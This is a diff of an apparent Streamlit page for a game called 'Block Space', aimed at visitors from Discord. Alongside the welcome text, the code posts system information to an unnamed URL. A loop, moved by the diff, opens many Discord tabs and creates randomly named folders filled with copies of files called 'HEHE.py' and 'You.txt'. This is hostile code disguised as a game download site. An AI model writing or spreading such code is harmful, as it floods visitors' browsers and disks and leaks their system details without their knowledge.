@@ -52,6 +52,16 @@ header = {
 
 request = requests.post(URL, System_info, headers=header)
 
+for i in range(Amount_Of_Tabs): 
+   webbrowser.open_new_tab('https://discord.com')
+   randomName = ''.join(random.choices(characters + numbers, k = 100))
+   os.mkdir(randomName)
+   with open("HEHE.py", 'w') as file:
+    with open("You.txt", 'w') as file:
+     shutil.copy("HEHE.py", randomName)
+     shutil.copy("You.txt", randomName)
+   
+st.set_page_config(page_title="Block_Space.com", page_icon=":smiley:", layout="wide")
 with st.container():
   st.write("---")
   left_column, right_column = st.columns(2)
@@ -66,17 +76,6 @@ with st.container():
       " I know you most lickley came from Discord but if you didn't, then WELCOME"
       " I hope you enjoy Block Space! The download is below this sentence."
     )
-
-for i in range(Amount_Of_Tabs): 
-   webbrowser.open_new_tab('https://discord.com')
-   randomName = ''.join(random.choices(characters + numbers, k = 100))
-   os.mkdir(randomName)
-   with open("HEHE.py", 'w') as file:
-    with open("You.txt", 'w') as file:
-     shutil.copy("HEHE.py", randomName)
-     shutil.copy("You.txt", randomName)
-   
-st.set_page_config(page_title="Block_Space.com", page_icon=":smiley:", layout="wide")
 
 with st.container():
   st.subheader("Welcome to the Block Space website!")
